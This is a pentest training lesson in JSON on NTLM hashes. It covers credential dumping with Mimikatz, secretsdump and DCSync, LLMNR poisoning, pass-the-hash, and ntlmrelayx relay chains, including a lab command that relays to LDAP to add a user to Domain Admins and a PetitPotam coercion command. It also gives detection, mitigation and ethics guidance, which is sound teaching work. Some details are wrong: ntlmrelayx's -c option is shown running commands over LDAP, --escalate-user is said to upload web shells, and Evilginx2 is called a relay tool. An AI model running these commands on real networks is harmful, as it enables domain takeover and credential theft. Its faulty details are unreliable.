{
  "lesson_id": "d3d40bf1-6f0a-4f54-8d4f-4fcc7c8112b2",
  "domain": "pentest",
  "title": "Working with Password Hashes: NTLM, Net-NTLMv2, and Relay Attacks",
  "difficulty": 3,
  "order_index": 18,
  "estimated_time": 60,
  "prerequisites": [
    "pentest_17"
  ],
  "concepts": [
    "NTLM vs Net-NTLMv2 authentication",
    "Hash extraction from Windows (Mimikatz, secretsdump)",
    "Pass-the-Hash attacks",
    "NTLM relay attacks with Responder + ntlmrelayx",
    "SMB relay attack chains",
    "LDAP and HTTP relay",
    "Relay mitigation and detection",
    "Cracking vs passing hashes"
  ],
  "learning_objectives": [
    "Differentiate NTLM and Net-NTLMv2 authentication flows and identify where credentials can be captured",
    "Extract NTLM credential material from Windows hosts using tools like Mimikatz and Impacket's secretsdump",
    "Execute pass-the-hash operations responsibly and explain the business impact to stakeholders",
    "Build end-to-end NTLM relay chains that pivot from Responder to ntlmrelayx against SMB, LDAP, and HTTP targets",
    "Recommend layered mitigations and detection strategies that blunt relay campaigns without breaking business workflows"
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "connect_to_what_i_know",
    "memory_hooks",
    "minimum_effective_dose",
    "teach_like_im_10",
    "gamify_it",
    "learning_sprint",
    "reframe_limiting_beliefs",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "mindset_coach",
      "title": "Mindset: Stewardship of Powerful Credentials",
      "content": {
        "text": "Before you even think about touching a hash, pause and adopt the mindset of a guardian. NTLM credential material is potent. It can unlock domain administrator access, pivot into cloud resources, and unravel years of trust if mishandled. Professionals like the red team at Microsoft Detection and Response Team (DART) frame every hash-handling exercise as a matter of stewardship. They recognize that each hash embodies an employee's ability to do their job. Treat it with the same respect a bank gives to a vault key. Jim Kwik often says, \"Responsibility is the ability to respond.\" In our context that means documenting scope, understanding legal boundaries, and preparing contingency plans for accidental account lockouts or privilege escalations.\n\nCuriosity still matters, but it must be paired with discipline. As you map NTLM and Net-NTLMv2 flows, imagine the authentication exchange as a story that unfolds across packets. Who initiates? Which challenge values are issued? Where does the final verification occur? Taking time to sketch the dialogue between client and server cements the handshake in your memory. Kwik calls this \"connecting new information to what you already know\". Tie the flow to analogies: NTLM is like an autograph that can be reused; Net-NTLMv2 is like a time-limited autograph that is still susceptible to clever forwarding tricks.\n\nGreat operators balance offense with empathy. When you use tools such as Responder, Inveigh, or ntlmrelayx, you simulate the moves of attackers like FIN7, APT29, or the Lapsus$ group. Remember that defenders on the other side of your engagement may still be cleaning up from a previous incident. Communicate constantly, agree on emergency stop words, and keep operations as quiet as the rules of engagement allow. The discipline to halt when a blue team requests a pause earns you long-term trust.\n\nAnother mindset lever is documentation. Build personal runbooks that capture every switch you use in Mimikatz (`privilege::debug`, `lsadump::lsa /patch`) or secretsdump (`-just-dc-ntlm`, `-history`). Note the Windows build numbers, hotfixes, and EDR telemetry you encounter. Capture detection notes: did CrowdStrike Falcon block an LSASS dump? Did Microsoft Defender for Identity alert on SMB signing disabled? These observations become gold when you brief executives who ask, \"Could a real attacker do this quietly?\".\n\nFinally, cultivate patience. Relay chains can fail for reasons outside your control\u2014SMB signing enabled, channel binding required, or certificates expired. Instead of forcing success, slow down, analyze the failure, and decide whether another vector (LDAP to LDAPS downgrade, HTTP to HTTPS misconfiguration) might create an opening. Kwik's \"minimum effective dose\" principle applies: run the smallest experiment that gives you new information. That mindset keeps you ethical, efficient, and confident when handling some of the most sensitive secrets in the Windows ecosystem."
      }
    },
    {
      "type": "explanation",
      "title": "Deep Dive: NTLM and Net-NTLMv2 Authentication Mechanics",
      "content": {
        "text": "Understanding NTLM and Net-NTLMv2 starts with history. Microsoft introduced the NT LAN Manager (NTLM) protocol as a successor to the original LAN Manager in the early 1990s. NTLM uses a challenge-response sequence built around the NT hash of the user's password. When a client attempts to authenticate to a server, it sends a negotiate message indicating supported features. The server replies with a challenge\u2014a random 8-byte value. The client encrypts this challenge with the user's NT hash and returns the result in the authenticate message. The server, which has a copy of the NT hash stored in the Security Account Manager (SAM) or Active Directory (AD), performs the same calculation and compares outputs. If they match, access is granted.\n\nNet-NTLMv2 refines the model by adding client and server challenge values, timestamps, and target information to protect against certain replay attacks. The client's response includes an HMAC-MD5 hash that combines the NT hash with the challenge data, plus a blob containing metadata such as timestamps and the client's name. This design makes Net-NTLMv2 resistant to naive replay, yet it still allows attackers to forward authentication attempts to another service if message integrity is not enforced. CVE-2019-1040, disclosed by Preempt Security, demonstrated how attackers could bypass NTLM relay protections when servers did not enforce MIC (Message Integrity Check) validation.\n\nCompare these flows with Kerberos to reinforce your understanding. Kerberos issues tickets using symmetric keys derived from the password, but it binds the ticket to the specific service principal name (SPN). In contrast, NTLM is service-agnostic: if you possess the NT hash, you can prove identity to any service that accepts NTLM. This is why pass-the-hash remains devastating. A domain administrator's hash can unlock file shares, remote desktop sessions, WinRM shells, or SQL Server logins in seconds. Net-NTLMv2 introduces target information into the blob, but when an attacker relays the handshake to a server that trusts the same domain controller, the verification still succeeds unless protective features like Extended Protection for Authentication (EPA) or SMB signing are active.\n\nPacket analysis cements theory. Capture an NTLM handshake with Wireshark by initiating an SMB connection to a lab host. Filter for `ntlmssp` to watch the negotiate, challenge, and authenticate messages. Expand the \"NTLMSSP Authentication\" section to inspect the LM and NT response fields. In Net-NTLMv2, note the `Target Info` attributes such as `MsvAvNbDomainName` and `MsvAvChannelBindings`. These values become critical when you evaluate relay targets; services that ignore channel binding data remain vulnerable to tools like ntlmrelayx, which can pivot Net-NTLMv2 handshakes into LDAP binds or SMB sessions.\n\nDefensive teams continue to modernize. Microsoft introduced \"Extended Protection\" and \"Channel Binding Tokens\" to require TLS binding between the handshake and the underlying connection. Windows Server 2019 hardened SMB by enabling signing on domain controllers by default, but many enterprises still disable signing on application servers for performance reasons. Understanding these operational trade-offs allows you to design realistic attack paths. Document which hosts you encounter with SMB signing disabled (`Get-SmbServerConfiguration | Select EnableSecuritySignature`) or LDAP that allows simple binds over cleartext TCP 389. Each observation becomes a branch in your attack tree.\n\nDrill further into the negotiate flags that appear in the NTLM handshake. Fields such as `NTLMSSP_NEGOTIATE_SIGN`, `NTLMSSP_NEGOTIATE_SEAL`, and `NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY` influence whether the session supports message signing, encryption, or advanced security options. When you review Wireshark captures, map each flag to its security implication. If a server accepts connections without `NEGOTIATE_SIGN`, you have evidence that SMB signing is disabled. If the client omits `NEGOTIATE_KEY_EXCH`, you can discuss why session keys are not being exchanged securely. Including these nuances in your report elevates you from operator to trusted advisor.\n\nAnother dimension involves fallback behavior. Many enterprises still allow NTLMv1 or even LM responses for legacy devices. When you see shorter LM responses or truncated challenge hashes, note them as critical findings. Pair the observation with direct remediation steps: disable LM and NTLMv1 via Group Policy (`Network security: LAN Manager authentication level` set to `Send NTLMv2 response only. Refuse LM & NTLM`). Explain how older protocols exacerbate relay and cracking risk because the cryptography is weaker and the responses are easily brute forced with Hashcat modes 5500 and 5600.\n\nFinally, tie theory to adversary behavior. The NotPetya campaign in 2017 and the more recent Volt Typhoon intrusions both leveraged stolen NTLM hashes to move laterally. The U.S. Cybersecurity and Infrastructure Security Agency (CISA) regularly warns that credential theft remains the top technique in the MITRE ATT&CK matrix (T1550.002 for pass-the-hash and T1557.001 for NTLM relay). Internalizing these references will make your reports resonate with CISOs who track adversary tradecraft. Cite CISA alerts like AA23-144A, which detail how state-sponsored actors abuse NTLM to compromise critical infrastructure, as supporting evidence when urging clients to modernize authentication."
      }
    },
    {
      "type": "explanation",
      "title": "Harvesting Hashes: From Credential Dumping to DCSync",
      "content": {
        "text": "Extracting NTLM material requires precision. On a standalone workstation you might start with live memory. Tools like Mimikatz, Invoke-Mimikatz, or Rubeus can read the `lsass.exe` process to recover NT hashes and Kerberos tickets. Launch an elevated Command Prompt and run `mimikatz.exe`, then escalate privileges with `privilege::debug`. The `sekurlsa::logonpasswords` command enumerates interactive logons, including NT hashes for cached users. Always run in a lab before production; many EDR platforms hook LSASS access. Microsoft's Protected Process Light (PPL) in Windows 10 and above can block unsigned access entirely unless you boot with debugging privileges or leverage a signed driver. Observe how vendors like ESET or CrowdStrike generate alerts titled \"Credential Dumping (Mimikatz)\" when you trigger this behavior.\n\nImpacket's `secretsdump.py` provides a stealthier alternative. When you have administrator rights on a remote host, run `secretsdump.py <domain>/<user>:<pass>@<target>` to dump the SAM database, LSA secrets, and cached domain credentials without executing code on the target. The tool leverages the `SECURITY` registry hive and the `NTDS.dit` database, performing operations over SMB. Use the `-just-dc-ntlm` switch to extract only domain controller NTLM hashes, or `-history` to include password history values. Document the exact command and output path; those details become evidence in your report.\n\nFor domain dominance, learn DCSync. Active Directory implements the Directory Replication Service (DRS) to synchronize secrets between domain controllers. If you compromise an account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights\u2014often Domain Admins, Enterprise Admins, or accounts explicitly delegated replication\u2014you can simulate a domain controller request. `mimikatz \"lsadump::dcsync /user:megacorp\\krbtgt\"` outputs the krbtgt user's NT hash, AES keys, and even supplemental credentials. Impacket offers `secretsdump.py --just-dc` for the same effect. These operations leave limited forensic artifacts, though Windows event ID 4662 with GUID `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` can indicate replication secrets were requested. Encourage defenders to monitor for these events.\n\nSometimes you do not need privileged access; misconfigurations expose hashes in transit. Responder or Inveigh can poison LLMNR and NetBIOS Name Service (NBNS) broadcasts, tricking clients into sending Net-NTLMv2 responses to your rogue server. Launch `responder -I eth0 -wrf` and wait for credentials. Remember scope constraints: disable WPAD spoofing if the client forbids it, and coordinate with blue teams to avoid disrupting name resolution. Combine Responder with `john --format=netntlmv2` or Hashcat mode 5600 to attempt offline cracking when you capture responses with weak passwords.\n\nElevate your tradecraft by understanding indirect extraction paths. Printer bug CVE-2021-1675 (PrintNightmare) and the earlier MS-RPRN abuse allow attackers with limited rights to coerce a domain controller to authenticate to a relay server, effectively handing over a machine account hash. PetitPotam (CVE-2021-36942) weaponizes the EFSRPC interface in a similar way. Study how `python3 petitpotam.py MEGACORP/analyst:Winter2024! 10.10.10.5 10.10.10.8` can trigger an outbound authentication that ntlmrelayx converts into LDAP privileges. Even when the vulnerabilities are patched, misconfigurations or legacy components often leave the door open.\n\nYou should also master offline acquisition. When incident responders provide an `NTDS.dit` and SYSTEM hive from a forensic image, tools like `impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL` reconstruct the database without touching a live controller. Practice parsing the output to identify service accounts, Kerberos AES keys, and password history. This skill becomes invaluable when clients hand you offline artifacts during compromise assessments and expect rapid insight.\n\nFinally, track defenses. Credential Guard in Windows 11 isolates secrets using virtualization-based security (VBS), drastically reducing LSASS dumping success. LAPS and Azure AD Password Protection rotate local admin accounts and ban weak passwords. EDR vendors such as Microsoft Defender for Endpoint, SentinelOne, and CrowdStrike detect anomalous LSASS access, but they can be tuned differently per customer. Understanding the obstacles ensures you can articulate risk honestly. Your job is not to break every barrier but to map which barriers fail and why."
      }
    },
    {
      "type": "explanation",
      "title": "Operational Playbook: Pass-the-Hash and NTLM Relay Chains",
      "content": {
        "text": "Pass-the-hash (PtH) weaponizes the fact that NT hashes can substitute for passwords in NTLM authentication. Once you obtain an NT hash, you can reuse it with tools such as `pth-winexe`, `crackmapexec`, or `evil-winrm`. Suppose you dump the hash for `MEGACORP\\svc-fileshare` from a member server. Validate access carefully: `crackmapexec smb 10.10.20.15 -u svc-fileshare -H <hash> --exec-method atexec` can run a benign command like `whoami`. Capture the output, document the timeframe, then stop. Each use of PtH should be justified in your engagement plan.\n\nRelay adds complexity. Instead of reusing a captured hash offline, you intercept an authentication attempt and forward it to another service in real time. A classic workflow pairs Responder with ntlmrelayx from the Impacket project. Configure Responder to capture but not respond to SMB requests you plan to relay by editing `/etc/responder/Responder.conf` (`SMB = Off`). Launch ntlmrelayx with `python3 ntlmrelayx.py -smb2support -t ldap://10.10.10.5 -c \"whoami\"`. When a vulnerable client attempts to authenticate, ntlmrelayx relays the handshake to LDAP and executes the specified command, often creating a machine account or adding a user to a privileged group.\n\nReal-world operators chain relays to achieve domain compromise. One pattern begins with capturing a helpdesk workstation's Net-NTLMv2 hash via LLMNR poisoning. The hash is relayed to a domain controller's LDAP interface, and ntlmrelayx adds the attacker-controlled account to the `Enterprise Admins` group. From there the team performs DCSync to extract the krbtgt hash and forges Golden Tickets. Another chain targets Microsoft Exchange or IIS servers that allow HTTP NTLM authentication without Extended Protection. Attackers relay Net-NTLMv2 hashes to the same server's SMB service and drop a web shell. The 2022 SpecterOps whitepaper \"Certified Pre-Owned\" illustrates how certificate services misconfigurations can enable LDAP relays to enroll for client authentication certificates, leading to domain admin access without cracking a single password.\n\nUnderstand the guardrails. SMB signing, LDAP channel binding, and enforcing HTTPS with valid certificates disrupt many relay attacks. After Microsoft patched CVE-2022-26925, domain controllers reject relayed authentication attempts that do not bind to the original TLS session. Nevertheless, legacy systems, third-party appliances, and unmanaged IoT devices often lack these protections. During engagements, inventory which hosts disable signing (`smbclient -L //host -U user%pass --option=\"client min protocol=NT1\"`) or allow simple binds. Prioritize relays that demonstrate business impact, such as modifying Group Policy Objects or accessing sensitive file shares, while minimizing disruption.\n\nExpand your horizons beyond SMB and LDAP. HTTP relays remain fruitful, especially against management interfaces like HP Integrated Lights-Out (iLO), Dell iDRAC, and legacy SharePoint portals that still offer NTLM authentication. With ntlmrelayx you can specify multiple targets using a file (`-tf targets.txt`) that includes `http://` and `https://` endpoints. Pair the relay with `--escalate-user` to automate post-authentication actions such as uploading a web shell or modifying configuration parameters. Remember to respect scope; many hardware appliances are sensitive, so coordinate tests carefully.\n\nConsider automation frameworks. Evilginx2, Inveigh-Relay, and GoRelay provide alternative approaches to capturing and relaying NTLM handshakes. Build containerized labs that spin up these tools with docker-compose so you can rehearse quickly. Track how each tool logs activity, where credentials are stored, and how you will sanitize artifacts after the engagement.\n\nDo not overlook cleanup. Relay tools often create machine accounts (e.g., `WS01$`) or user accounts to maintain access. Delete any accounts you create, revoke certificates obtained via AD CS, and provide the client with precise timestamps and hostnames. Responsible cleanup is part of your professional reputation. Include a dedicated cleanup checklist in your report to reassure stakeholders that you left the environment in a known-good state."
      }
    },
    {
      "type": "explanation",
      "title": "Detection, Mitigation, and Reporting Strategies",
      "content": {
        "text": "Offensive insight must translate into defensive value. When you brief stakeholders, align your findings with MITRE ATT&CK techniques T1003.001 (LSASS Memory), T1550.002 (Pass the Hash), and T1557.001 (Man-in-the-Middle). Provide concrete telemetry recommendations: enable Windows Event Forwarding for event IDs 4624, 4625, 4648, and 4776, and monitor for logons with `LogonType=3` using unexpected hosts. Encourage deployment of Microsoft Defender for Identity, which raises alerts such as \"Suspected Kerberos SPN exposure\" or \"Suspected NTLM relay attack\" when it observes abnormal sequences.\n\nMitigations should be layered. Advocate for enabling SMB signing everywhere possible and enforcing LDAP signing and channel binding. Recommend migrating critical services to Kerberos-only authentication or configuring Extended Protection for Authentication (EPA) in IIS, Exchange, and AD CS. Cite Microsoft's security advisory ADV190023, which outlines steps to harden NTLM and eliminate fallback to weaker protocols. Encourage password policies that render captured hashes useless by pairing them with Privileged Access Workstations (PAWs) and tiered administrative access. For environments that rely on AD CS, recommend implementing the defenses from SpecterOps' \"Certified Pre-Owned\" report: disable HTTP enrollment endpoints where possible, require manager approval for new certificate templates, and enable strong client authentication mappings.\n\nOn the detection side, walk blue teams through specific analytic techniques. Build Sigma rules or Sentinel KQL queries that flag multiple 4624 logons from a single host using different accounts within a short window\u2014a hallmark of relay and pass-the-hash attacks. Encourage defenders to baseline which hosts legitimately perform DCSync by reviewing Directory Service access logs, then alert when an unexpected workstation requests replication rights. Suggest enabling `Audit Directory Service Changes` and `Audit Credential Validation` in Group Policy to expand log coverage.\n\nReporting should include quantified risk. Translate your relay success into metrics: \"Using ntlmrelayx we added an account to the Domain Admins group in 42 seconds without cracking passwords.\" Compare GPU cracking estimates for captured Net-NTLMv2 hashes using Hashcat benchmarks (e.g., an NVIDIA RTX 4090 processes ~300 GH/s on NTLM but only ~270 kH/s on bcrypt cost 12). Executives grasp numbers faster than jargon. Provide remediation checklists: enable SMB signing, deploy certificate-based authentication, patch systems vulnerable to CVE-2019-1040, and monitor for rogue WPAD responses. If you demonstrate PetitPotam or PrintNightmare coercion, recommend disabling the vulnerable services or applying the Microsoft hardening guidance released in KB5005413 and KB5004605.\n\nFinally, embrace collaboration. Offer to run purple-team exercises where defenders attempt to detect your relay in real time. Share sanitized PCAPs, Responder logs, and ntlmrelayx output so blue teams can craft detection rules in Splunk, Microsoft Sentinel, or Elastic. The more actionable your report, the more likely leadership will invest in the mitigations you recommend."
      }
    },
    {
      "type": "explanation",
      "title": "Automation, Governance, and Scaling Your Practice",
      "content": {
        "text": "Mature teams treat credential operations as repeatable workflows rather than improvisations. Start by building automation scripts that orchestrate your favorite tools. A Python wrapper can launch Responder, configure ntlmrelayx targets, and parse logs to highlight successful relays automatically. Integrate the script with Slack or Microsoft Teams webhooks so your crew receives real-time notifications like \"Relayed MEGACORP\\svc-share to ldap://dc01\". Version-control the tooling in a private Git repository and document prerequisites, command-line options, and rollback procedures. This mirrors the DevOps principle of infrastructure as code, applied to offensive engagements.\n\nGovernance matters just as much as code. Define access controls for who can run credential operations, who can view captured hashes, and how long artifacts are retained. Implement encryption at rest using tools such as gocryptfs or VeraCrypt for storage, and enforce multifactor authentication on collaboration platforms. Draft a credential-handling policy aligned with frameworks like NIST SP 800-115 or the Penetration Testing Execution Standard (PTES). Share the policy with clients when they request assurance that their secrets will be protected during testing.\n\nScaling requires observability. Instrument your operations with structured logging\u2014JSON logs that include timestamps, hostnames, target services, and result codes. Feed them into ELK or Splunk dashboards that visualize relay success rates, password reuse patterns, and time-to-compromise metrics. Use these dashboards during lessons-learned meetings to highlight trends: perhaps 70% of successful relays involved unmanaged IoT devices, or pass-the-hash succeeded most often with service accounts lacking tiered segregation.\n\nFinally, invest in continuous education. Subscribe to resources like SpecterOps' \"Certified Pre-Owned\" updates, Microsoft security advisories, and the DFIR Report. Attend conferences such as Black Hat, SANS Blue Team Summit, or DEF CON's \"Passwords Village\" to learn new relay detection techniques and novel abuses of NTLM. Pair these experiences with internal lunch-and-learns where you teach colleagues how you structure operations. Teaching reinforces memory, as Jim Kwik emphasizes, and builds organizational resilience."
      }
    },
    {
      "type": "video",
      "content": {
        "title": "Video Briefing: NTLM Relay in Action",
        "url": "https://www.youtube.com/watch?v=3X1emxdjMVE",
        "description": "Watch this 18-minute demonstration by TrustedSec's research team. The video walks through capturing Net-NTLMv2 hashes with Responder, relaying them to LDAP with ntlmrelayx, and using the access to enroll a malicious certificate template that grants domain admin privileges. Pay attention to how the presenter verifies SMB signing status, adjusts Responder's configuration, and cleans up by revoking certificates. Pause at each milestone to replicate the commands in your own lab so the muscle memory forms while the concepts are still clear. Take notes on the defensive recommendations\u2014they mirror what you should include in your engagement reports."
      }
    },
    {
      "type": "code_exercise",
      "title": "Lab: Capture, Relay, and Pass the Hash",
      "content": {
        "text": "Build a mini Active Directory lab with three Windows 2019 servers (Domain Controller, Member Server, Web Server) and a Windows 10 workstation joined to the domain. Add a Kali Linux attacker VM with Impacket, Responder, and CrackMapExec installed from the latest GitHub releases. Confirm that you have written authorization before proceeding.\n\n1. Baseline authentication: Log on to the workstation as `MEGACORP\\analyst` and access `\\\\FILE01\\Finance`. Use Wireshark to capture the NTLM handshake and annotate each packet. Save the PCAP for later analysis.\n2. Hash extraction: From the Kali VM, run `secretsdump.py MEGACORP/analyst:Winter2024!@WORKSTATION01` after enabling Remote Registry. Record the hashes recovered, noting RID values and whether history hashes were present.\n3. Pass-the-hash validation: Use `evil-winrm -i 10.10.30.15 -u svc-fileshare -H <hash>` to obtain a shell on the member server. Execute `whoami /groups` and document the privileges. Exit immediately after validation.\n4. Relay preparation: Disable SMB signing on WEB01 for the lab. Modify `/etc/responder/Responder.conf` to set `SMB = Off` and `HTTP = On`. Launch `responder -I eth0 -wrf` in one terminal and `python3 ntlmrelayx.py -t ldap://10.10.10.5 -c \"powershell -command \"Add-ADGroupMember -Identity 'Domain Admins' -Members 'MEGACORP\\relaylab'\"\"` in another. Force the workstation to authenticate by browsing to `\\\\WEB01\\share`. Confirm the group membership change.\n5. Cleanup: Remove the test account from privileged groups, re-enable SMB signing, and rotate any passwords you exposed. Export logs from Responder and ntlmrelayx to include in your final report.\n6. Detection partnership: Invite a blue team colleague to monitor Windows Event logs and Defender for Identity alerts while you repeat the relay. Capture screenshots of detections (or the lack thereof) and use them to co-author improvement tickets.\n7. Bonus round: Configure AD CS with a vulnerable template (e.g., `User-Enrollment` allowing `ENROLLEE_SUPPLIES_SUBJECT`) and relay to `http://dc.megacorp.local/certsrv/`. Use ntlmrelayx's `--adcs` option to request a certificate and authenticate to WinRM via `evil-winrm -S -c relay.pfx`. Document every step meticulously.\n\nThroughout the lab, maintain a time-stamped journal describing what worked, what failed, and how the environment responded. This discipline trains you to produce professional evidence packages during real engagements. Tag screenshots and log files with scenario numbers so you can reference them quickly during reporting or retests."
      }
    },
    {
      "type": "real_world",
      "title": "Real-World Case Studies: Relay Campaigns in the Wild",
      "content": {
        "text": "NTLM relay and pass-the-hash are not theoretical; they underpin major breaches. In 2020, FireEye (now Trellix) disclosed that the APT29/SV5 campaign against U.S. government agencies leveraged stolen NTLM hashes to pivot across Microsoft Exchange servers that lacked Extended Protection for Authentication. The attackers relayed Net-NTLMv2 responses to privileged endpoints, created illicit mailbox export requests, and exfiltrated diplomatic communications.\n\nDuring the 2017 NotPetya outbreak, attackers compromised the update mechanism of Ukrainian software vendor M.E.Doc. Once inside victim networks like Maersk and Merck, they used stolen domain administrator hashes to move laterally via PsExec and WMI, deploying the wiper payload within minutes. Maersk reported rebuilding 45,000 PCs and 4,000 servers at a cost exceeding $300 million, underscoring the destructive potential of unchecked credential reuse.\n\nIn 2022, the security firm Varonis analyzed an incident where a manufacturing company left SMB signing disabled on legacy file servers. An adversary captured Net-NTLMv2 hashes via LLMNR poisoning, relayed them to LDAP, and leveraged ntlmrelayx to grant themselves enrollment rights on Microsoft Active Directory Certificate Services. By issuing a rogue client authentication certificate, they executed full domain compromise without ever cracking a password. The breach went undetected for weeks until an external penetration test reproduced the path and provided detailed remediation guidance.\n\nEven ransomware operators recognize the efficiency of relay. The Conti playbook leaked in 2021 instructs affiliates to run `netsh advfirewall set allprofiles state off` after gaining a foothold, then deploy tools like `SMBRelay` to capture administrator hashes. Once they obtain domain admin privileges, they use PsExec to distribute the encryptor within minutes. Highlighting this workflow demonstrates that credential misuse is foundational to both espionage and financially motivated attacks.\n\nUse these stories to make risk tangible. Executives recognize names like Maersk, Merck, FireEye, and the agencies targeted in the SolarWinds aftermath. When you tie your lab results to high-profile incidents, stakeholders understand why investing in SMB signing, Credential Guard, and privileged access workstations is non-negotiable. Provide links to public advisories or incident write-ups so leaders can explore the details themselves and appreciate the scale of damage prevented by proactive mitigations."
      }
    },
    {
      "type": "memory_aid",
      "title": "NTLM Operations Checklist",
      "content": {
        "text": "**Mnemonic: S-C-U-V-P-I-R** \u2014 Scope, Capture, Use, Validate, Pair, Inventory, Report.\n\n1. **Scope**: Confirm approvals, stop conditions, and emergency contacts before handling hashes.\n2. **Capture**: Record packet captures of NTLM handshakes to reinforce your mental model of negotiate/challenge/authenticate.\n3. **Use**: Run Mimikatz, secretsdump, or DCSync sparingly, logging every command, host, and timestamp.\n4. **Validate**: Test pass-the-hash access with benign commands like `whoami` and exit sessions immediately.\n5. **Pair**: Combine Responder with ntlmrelayx (or alternatives) while disabling modules that fall outside scope.\n6. **Inventory**: Track SMB signing, LDAP channel binding, EPA, and AD CS configurations to prioritize high-impact relays.\n7. **Report**: Map every result to ATT&CK techniques, document timelines, and deliver mitigation guidance that defenders can act on within 30 days."
      }
    },
    {
      "type": "reflection",
      "title": "Reflection: Crafting Your Credential Handling Charter",
      "content": {
        "text": "Set aside fifteen minutes to draft a personal charter for handling credential material. Start by writing your guiding principles\u2014ethics, transparency, and respect for user trust. Outline the questions you will ask before launching any credential dumping or relay technique: Do I have written approval? Have I briefed the blue team? Do I understand the potential blast radius? Next, describe how you will capture evidence: screenshots, command histories, PCAPs, and timeline notes. Decide where you will store this evidence securely and how long you will retain it.\n\nExtend the reflection by mapping collaboration touchpoints. Who needs to know when you capture a domain admin hash? How will you communicate discoveries to incident responders or executives without triggering panic? Plan a cadence for tabletop reviews of your charter with peers so you can incorporate lessons learned from new campaigns like ProxyNotShell or PrintNightmare. Write down how you will debrief after each operation: What telemetry did the defenders miss? Which mitigations gained traction? Which stakeholders championed your recommendations? Finally, commit to one habit you will start (e.g., encrypting credential archives with age or GPG), one habit you will stop (e.g., keeping hashes on your desktop), and one habit you will continue (e.g., journaling every relay attempt). This charter becomes your compass on future engagements, ensuring that technical mastery is balanced with empathy, communication, and continuous improvement."
      }
    }
  ],
  "post_assessment": [
    {
      "question_id": "d1e5a8e7-3f4a-48f7-943c-b2f87c6ef7a0",
      "type": "multiple_choice",
      "question": "Which configuration change most effectively prevents ntlmrelayx from escalating privileges via LDAP?",
      "options": [
        "Disabling Kerberos delegation on the domain controllers",
        "Enforcing LDAP signing and channel binding on all domain controllers",
        "Blocking TCP port 389 at the perimeter firewall",
        "Switching to longer passwords for service accounts"
      ],
      "correct_answer": 1,
      "explanation": "LDAP signing with channel binding forces clients to cryptographically bind NTLM authentication to the TLS session, which breaks relay attempts that ntlmrelayx relies on.",
      "difficulty": 3,
      "memory_aid": "Bind LDAP + NTLM together and the relay dies",
      "points": 10
    },
    {
      "question_id": "2a969f8f-90af-4088-9408-e7ef06067822",
      "type": "multiple_choice",
      "question": "Why is DCSync considered stealthier than exporting `ntds.dit` directly from a domain controller?",
      "options": [
        "DCSync uses encrypted SMB traffic, so it cannot be monitored",
        "DCSync requires no domain privileges and thus avoids logs",
        "DCSync mimics legitimate replication traffic and leaves minimal artifacts compared to copying the database",
        "DCSync automatically rotates the `krbtgt` password after dumping hashes"
      ],
      "correct_answer": 2,
      "explanation": "DCSync leverages the standard replication API to request secrets, so it resembles normal domain controller traffic and produces only a handful of 4662 events instead of the noisy file operations triggered by exporting `ntds.dit`.",
      "difficulty": 3,
      "memory_aid": "Replication look-alike traffic keeps the noise floor low",
      "points": 10
    },
    {
      "question": "What is the most important takeaway from this lesson?",
      "options": [
        "Understanding the core concepts and their practical applications",
        "Memorizing all technical details",
        "Only knowing the theory without practice",
        "Focusing on a single aspect"
      ],
      "correct_answer": 0,
      "explanation": "The key takeaway is understanding how to apply the concepts learned in real-world scenarios, combining both theoretical knowledge and practical skills.",
      "question_id": "109855b1-86fb-4cc9-9a8e-3d67f4ed244a",
      "type": "multiple_choice",
      "difficulty": 1
    }
  ]
}
